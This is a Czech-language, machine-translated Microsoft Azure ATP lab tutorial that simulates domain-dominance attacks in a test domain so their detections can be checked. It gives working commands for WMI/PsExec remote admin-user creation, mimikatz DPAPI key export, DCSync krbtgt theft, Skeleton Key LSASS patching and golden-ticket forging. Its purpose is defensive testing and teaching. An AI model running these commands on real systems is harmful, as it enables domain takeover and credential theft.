---
title: Playbook Dominance v doméně ochrany ATP v programu Azure | Dokumentace Microsoftu
description: Playbook dominance v doméně služby Azure ATP popisuje, jak simulovat útoky dominance v doméně pro zjišťování pomocí služby Azure ATP
ms.service: azure-advanced-threat-protection
ms.topic: tutorial
author: mlottner
ms.author: mlottner
ms.date: 02/28/2019
ms.reviewer: itargoet
ms.openlocfilehash: b3ea5b1d2f33f9647fb9dea8927a80aeae76ee03
ms.sourcegitcommit: 7a32dcb65edc38fb9b3d340763045b21ea92feee
ms.translationtype: MT
ms.contentlocale: cs-CZ
ms.lasthandoff: 04/18/2019
ms.locfileid: "59745585"
---
# <a name="tutorial-domain-dominance-playbook"></a>Kurz: Playbook dominance v doméně

Poslední kurz v této sérii čtyř částí pro výstrahy zabezpečení služby Azure ATP se playbook dominance v doméně. Účelem ochrany ATP v programu Azure testovacího prostředí výstrahy zabezpečení je pro ilustraci **ochrany ATP v programu Azure**možnosti v identifikaci a zjištění možných útoků vaší sítě. Testovací prostředí vysvětluje, jak testujeme funkčnost ve některé služby Azure ATP *diskrétní* detekce pomocí služby Azure ATP *podpis*– na základě funkcí. V kurzech jsou služby Azure ATP rozšířené strojové učení, uživatele, nebo na základě entity chování detekce a výstrahy. Typy detekce a výstrahy nejsou součástí testování, protože vyžadují období učení a skutečné síťový provoz po dobu až 30 dnů. Další informace o jednotlivých kurzu této série najdete v článku [přehled výstrah laboratoře zabezpečení ochrany ATP v programu](atp-playbook-lab-overview.md).

Playbook ukazuje u některých detekcí hrozeb dominance v doméně a služby Výstrahy zabezpečení ze služby Azure ATP s použitím simulovaného útoků z běžných, reálného světa, veřejně dostupné hacking a nástrojů útoku. Metody popsané se obvykle používají v tomto okamžiku řetězu událostí útoku kybernetických k dosažení dominance v doméně trvalé.

V tomto kurzu budete simulovat pokusy o dosažení dominance v doméně trvalé, abyste mohli zkontrolovat všechna detekce služby Azure ATP pro následující běžné metody:

> [!div class="checklist"]
> * Vzdálené spuštění kódu
> * Data Protection API (DPAPI)
> * Škodlivá replikace
> * Vytvoření služby
> * Skeleton Key
> * Zlatý lístek


## <a name="prerequisites"></a>Požadavky

1. [Dokončení ochrany ATP v programu zabezpečení oznámení testovacího prostředí](atp-playbook-setup-lab.md) 
     - Co možná nejvíce doporučujeme postupujte podle pokynů pro nastavení testovacího prostředí. Čím blíž testovacího prostředí je nastavení navrhované testovacího prostředí, tím snazší bude dodržovat testovacích postupů ochrany ATP v Azure.

2. [Dokončení kurzu playbook taktiky Lateral Movement](atp-playbook-lateral-movement.md)

## <a name="domain-dominance"></a>Dominance v doméně

V řetězu událostí internetového útoku během fáze dominance v doméně, útočník už získal legitimních přihlašovacích údajů pro přístup k řadiči domény. Útočník mohl získat přístup k řadiči domény znamená, že lze provést všechny úrovně škodu vaší sítě. Vedle okamžité poškození, útočníci, zejména sofistikované ty, které jsou, jako je umístit další *zásad* do prostředí jsme ohrožené. Zkontrolujte tyto útoky, i pokud je útočník původní zjištění útoky a akcemi, budou mít stále další možnosti trvalého ve vaší doméně, zvýšení jejich šance na dlouhodobý úspěch.

### <a name="remote-code-execution"></a>Vzdálené spuštění kódu

Vzdálené spuštění kódu je přesně to vypadá jako. Útočníci navázat způsob, jak vzdálené spuštění kódu proti prostředků v tomto případě proti řadiči domény. Zkusíme společně pomocí těchto běžných nástrojů k provedení vzdálené spuštění kódu a získání trvalého průniku řadič domény a zjistěte, co ochrany ATP v programu Azure zobrazuje.

- Windows Management Instrumentation (WMI)
- PsExec z webu SysInternals

Pomocí rozhraní WMI prostřednictvím příkazového řádku, pokuste se vytvořit proces místně na řadiči domény vytvořte uživatele s názvem "InsertedUser", s heslem: pa$ $w0rd1.

1. Otevřete příkazový řádek v kontextu spuštění *SamiraA* z **VictimPC**, spusťte následující příkaz:

   ``` cmd
   wmic /node:ContosoDC process call create "net user /add InsertedUser pa$$w0rd1"
   ```

2. Nyní s vytvořeným uživatelem, přidejte uživatele do skupiny "Administrators" na řadič domény:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula net localgroup "Administrators" InsertedUser /add
   ```

   ![Použití vzdálené spuštění kódu (PsExec), chcete-li přidat nového uživatele do skupiny Správci na řadiči domény](media/playbook-dominance-psexec_addtoadmins.png)

3. Přejděte na **uživatelé služby Active Directory a počítače (ADUC)** na **ContosoDC** a najít **InsertedUser**. 

4. Klikněte pravým tlačítkem na **vlastnosti** a zkontrolujte členství.

   ![Zobrazit vlastnosti "InsertedUser"](media/playbook-dominance-inserteduser_properties.png)

Funguje jako útočník, úspěšně jste vytvořili nový uživatel ve vašem testovacím prostředí pomocí rozhraní WMI. Pomocí nástroje PsExec také přidání nového uživatele do skupiny Administrators. Z hlediska trvalost byl vytvořen jinou legitimních přihlašovacích údajů nezávislé na řadiči domény. Nová pověření umožňují útočník trvalého přístupu k řadiči domény v případě, že předchozí přístup přihlašovacích údajů získala byl zjištěn a odstraněn.

### <a name="remote-code-execution-detection-in-azure-atp"></a>Detekce provádění vzdáleného kódu v Azure ATP

Přihlásit se k portálu ochrany ATP v programu Azure portal a zkontrolujte, co, pokud se něco, ochrana ATP v programu Azure zjistil od naší poslední simulované útoku:

![Zjišťování služby WMI vzdálené spuštění kódu Azure ATP](media/playbook-dominance-wmipsexecdetected.png)

Ochrana ATP v programu Azure zjistil rozhraní WMI a PsExec spuštění vzdáleného kódu.

Z důvodu šifrování v relaci rozhraní WMI nejsou viditelné určité hodnoty jako skutečný metody rozhraní WMI nebo výsledek útoku. Ale detekce služby Azure ATP z těchto akcí nám sdělíte ideální informace k obranné akci s.  

VictimPC, počítači, by nikdy provádění vzdáleného kódu na řadiče domény.

Jak služby Azure ATP se učí, který je vložen do které skupiny zabezpečení v čase, podobně jako podezřelé aktivity jsou označeny jako neobvyklé aktivity na časové ose. Protože toto testovací prostředí byl nedávno vytvořen a je pořád se nachází v období učení, tato aktivita se nezobrazí jako upozornění. Úprava zjišťování skupiny zabezpečení pomocí služby Azure ATP můžete ověřit kontrolou časové osy aktivity. Ochrana ATP v programu Azure můžete také generovat sestavy na všechny úpravy skupiny zabezpečení, které můžou být e-mailem vám aktivně.

Přístup **správce** stránky na portálu ochrany ATP v programu Azure pomocí nástroje hledání. Zjišťování služby Azure ATP vložení uživatele se zobrazí v časové osy aktivity skupinu pro správu.

![Přidání uživatele do skupiny zabezpečení citlivých zobrazení](media/playbook-dominance-admininserteduser.png)

### <a name="data-protection-api-dpapi"></a>Data Protection API (DPAPI)

Data Protection Application Programming rozhraní (DPAPI) používá Windows bezpečné ochrany hesel uložil prohlížeče, šifrované soubory a další citlivá data. Řadičích domény se nachází hlavní klíč, který může dešifrovat *všechny* tajné klíče z počítačů připojených k doméně Windows.

Pomocí **mimikatz**, pokusíme se exportovat hlavní klíč z řadiče domény. 

1. Spusťte následující příkaz proti řadiči domény:

   ``` cmd
   mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:ContosoDC.contoso.azure /export" "exit"
   ```

   ![Použijte nástroj mimikatz export záložní klíč rozhraní DPAPI ze služby Active Directory](media/playbook-dominance-dpapi_mimikatz.png)

2. Ověřte, že došlo k exportu souboru hlavní klíč. Hledejte v adresáři, ze kterého jste spustili mimikatz.exe z zobrazíte vytvořené soubory .der, .pfx, .pvk a .key. Zkopírování starší verze klíče z příkazového řádku.

Jako útočník, nyní je k dispozici klíč k dešifrování jakýchkoli dat DPAPI zašifrovaný soubor/citlivé z *jakékoli* počítačů v celé doménové struktuře.

### <a name="dpapi-detection-in-azure-atp"></a>Rozhraní DPAPI detekce v Azure ATP

Pomocí ochrany ATP v programu Azure portal, Pojďme ověřit, že ochrana ATP v programu Azure se úspěšně zjistilo naše rozhraní DPAPI útoku:

![Ochrana ATP v programu Azure zjistil DPAPI žádosti](media/playbook-dominance-dpapidetected.png)

### <a name="malicious-replication"></a>Škodlivá replikace

Škodlivá replikace umožňuje útočníkovi replikovat pomocí správce domény (nebo ekvivalentní) informace o uživateli přihlašovací údaje. Škodlivá replikace v podstatě umožňuje útočníkovi vzdáleně získávání přihlašovacích údajů. Samozřejmě je nejdůležitější účet pokusu o získávání "krbtgt" je to hlavní klíč používaný k podepisování všechny lístky protokolu Kerberos.

Jsou dvě společné hackerským nástroj sady, které útočníkům umožnit, aby se pokusit o škodlivou replikaci **Mimikatz**a zabezpečení jádra **Impacket**.

#### <a name="mimikatz-lsadumpdcsync"></a>Mimikatz lsadump::dcsync

Z **VictimPC**, v kontextu **SamirA**, spusťte následující příkaz Mimikatz:

``` cmd
mimikatz.exe "lsadump::dcsync /domain:contoso.azure /user:krbtgt" "exit" >> c:\temp\ContosoDC_krbtgt-export.txt
```

Informace o účtu "KRBTGT domény" jsme nastavili replikaci: c:\\temp\\ContosoDC_krbtgt-export.txt

![Škodlivá replikace prostřednictvím mimikatz](media/playbook-dominance-maliciousrep_mimikatz.png)

#### <a name="malicious-replication-detection-in-azure-atp"></a>Škodlivá replikace detekce v Azure ATP

Pomocí ochrany ATP v programu Azure portal, ověřte, zda že je teď o seznámen škodlivou replikaci, které jsme z VictimPC simulované SOC.

![Zjištění AATP škodlivou replikaci](media/playbook-dominance-maliciousrep_detected.png)

### <a name="skeleton-key"></a>Skeleton Key

Jiné domény dominance metoda útočníci používají, se nazývá **Skeleton Key**. Pomocí vytvoří útočník Skeleton Key, útočník může maskovat *jménem libovolného uživatele* na *kdykoli*. V rámci útoku typu Skeleton Key každý uživatel může dál přihlašovat se pomocí jejich normální heslo, ale každý ze svých účtů je také zadána heslo nadřazeného serveru. Nové heslo nadřazeného serveru. nebo Skeleton Key dává všem uživatelům, kteří ví, ho otevřete přístup k účtu. Útoku typu Skeleton Key se dosahuje prostřednictvím opravy Proces LSASS.exe na řadiči domény, vynucení uživatelů k ověřování prostřednictvím typ sníženou příbuzností šifrování.

Použijeme abyste viděli, jak funguje tento typ útoku typu Skeleton Key:

1. Přesunout **mimikatz** k **ContosoDC** pomocí **SamirA** jsme získali před přihlašovací údaje. Ujistěte se, že tak, aby nabízel správné architektuře **mimikatz.exe** podle typu architektura řadiče domény (64 bitů vs. 32bitová verze). Z **mimikatz** složce spusťte:

   ``` cmd
   xcopy mimikatz.exe \\ContosoDC\c$\temp
   ```

2. S **mimikatz** nyní připraveny na řadiči domény, vzdálené spuštění ho pomocí nástroje PsExec:

   ``` cmd
   PsExec.exe \\ContosoDC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "misc::skeleton" ^& "exit")
   ```

3. Úspěšně opraven v procesu služby LSASS **ContosoDC**.

   ![Útoku typu Skeleton Key přes nástroj mimikatz](media/playbook-dominance-skeletonkey.png)

### <a name="exploiting-the-skeleton-key-patched-lsass"></a>Služba LSASS využívajícím Skeleton Key opravit.

Na **VictimPC**, otevřete příkazový řádek (v rámci **JeffL**), spuštěním následujících příkazů zkuste stát kontext RonHD.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

Po zobrazení výzvy použijte záměrně chybné heslo. Tato akce prokáže, že účet *stále* má heslo po provedení útoku.  

![Použití * hesla chybná * po útoku typu Skeleton Key (Tato metoda funguje přesně tak, jak je popsáno)](media/playbook-dominance-skeletonkey_wrong.png)

Ale Skeleton Key přidá další heslo pro každý účet. Proveďte příkaz "Spustit jako" znovu, ale tato doba použití "nástroj mimikatz" jako heslo.

``` cmd
runas /user:ronhd@contoso.azure "notepad"
```

Tento příkaz vytvoří nový proces, *Poznámkový blok*, běží v kontextu RonHD. **Skeleton Key lze provést _jakékoli_ účtu, včetně účtů služeb a účtů počítačů.**

> [!Important]
> Je důležité, restartujte ContosoDC po provedení útoku typu Skeleton Key. Aniž by tak proces LSASS.exe počítači ContosoDC opravit, který se změnil, downgradu každý požadavek na ověření do RC4.

### <a name="skeleton-key-attack-detection-in-azure-atp"></a>Útoku typu Skeleton Key detekce v Azure ATP

Co ochrana ATP v programu Azure zjišťování a hlášení a to vše se děje?

![Zjištěný AATP útoku typu Skeleton Key](media/playbook-dominance-skeletonkey_detected.png)

Ochrana ATP v programu Azure se úspěšně zjistilo podezřelé předběžné ověření šifrování metodou pro tohoto uživatele.

### <a name="golden-ticket---existing-user"></a>Zlatý lístek - existujícího uživatele

Po krádeži "Zlatých lístků" ("krbtgt" účet vysvětlení [zde prostřednictvím škodlivou replikaci](#malicious-replication), útočník se moct přihlásit lístky *jako v případě, že jsou řadiče domény*. **Nástroj Mimikatz**, identifikátor SID domény a účet odcizeného "krbtgt" jsou všechny požadované k provedení tohoto útoku. Nejenže jsme generování lístků pro uživatele, budeme vytvářet lístky pro uživatele, kteří ještě neexistují.

1. Jako JeffL, spusťte následující příkaz na **VictimPC** získat identifikátorem SID domény:

   ``` cmd
   whoami /user
   ```

   ![Identifikátor SID pro uživatele zlatý lístek](media/playbook-dominance-golden_whoamisid.png)

2. Identifikujte a zkopírujte identifikátor SID domény zvýrazněn ve výše uvedeném snímku obrazovky.

3. Pomocí **mimikatz**, trvat zkopírovaný SID domény společně s odcizeného "krbtgt" NTLM hash uživatele ke generování lístku TGT. Vložte následující text do cmd.exe jako JeffL:

   ``` cmd
   mimikatz.exe "privilege::debug" "kerberos::golden /domain:contoso.azure /sid:S-1-5-21-2839646386-741382897-445212193 /krbtgt:c96537e5dca507ee7cfdede66d33103e /user:SamiraA /ticket:c:\temp\GTSamiraA_2018-11-28.kirbi /ptt" "exit"
   ```

   ![Generovat zlatý lístek](media/playbook-dominance-golden_generate.png)

   ```/ptt``` Část příkazu povolené, abychom mohli ihned Předat generované lístky do paměti.

4. Ujistíme se, že přihlašovací údaje v paměti.  Spustit ```klist``` v konzole.

   ![příkaz výsledky po úspěšném generovaných lístků](media/playbook-dominance-golden_klist.png)

5. Funguje jako útočník, spusťte následující příkaz, Pass-the-Ticket použít proti řadiči domény:

   ``` cmd
   dir \\ContosoDC\c$
   ```

   Úspěch! Jste vygenerovali **falešné** zlatý lístek pro SamiraA.

   ![Spouští úlohy prostřednictvím mimikatz zlatý lístek](media/playbook-dominance-golden_ptt.png)

Proč to fungovalo? Zlatý lístek útoku funguje, protože-the-ticket generované byla správně podepsána pomocí 'Účtu KRBTGT' klíč, který jsme který jste získali dříve. Tento lístek umožňuje nám, jako útočník získat přístup k ContosoDC a chceme přidat do skupiny zabezpečení, který jsme chtěli používat.

#### <a name="golden-ticket--existing-user-attack-detection"></a>Detekce útoku Golden Ticket - existujícího uživatele

Ochrana ATP v programu Azure využívá několik metod pro detekci podezřelých útoků tohoto typu. V tomto scénáři přesné zjistil ochrany ATP v programu Azure oslabení šifrování falešné lístku.

![Zlatý lístek zjištění](media/playbook-dominance-golden_detected.png)

> [!Important]
>Připomenutí. Tak dlouho, dokud KRBTGT získaných ze strany útočníka zůstává v platnosti v rámci prostředí, lístky, vygeneruje s ním také zůstávají platné. V tomto případě útočník dosahuje dominance v doméně trvalé až [KRBTGT není dvakrát resetován](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password).

## <a name="next-steps"></a>Další postup

* [Upozornění Průvodci zabezpečením Azure ATP](suspicious-activity-guide.md)
* [Prošetřování laterálních průnikových tras pomocí služby Azure ATP](use-case-lateral-movement-path.md)
* [Podívejte se na fórum služby Azure ATP.](https://aka.ms/azureatpcommunity)

## <a name="join-the-community"></a>Připojte se ke komunitě

Máte další dotazy nebo zájem o diskuze o ochrany ATP v programu Azure a souvisejícího zabezpečení s ostatními? Připojte se k [komunita ochrany ATP v programu Azure](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) ještě dnes!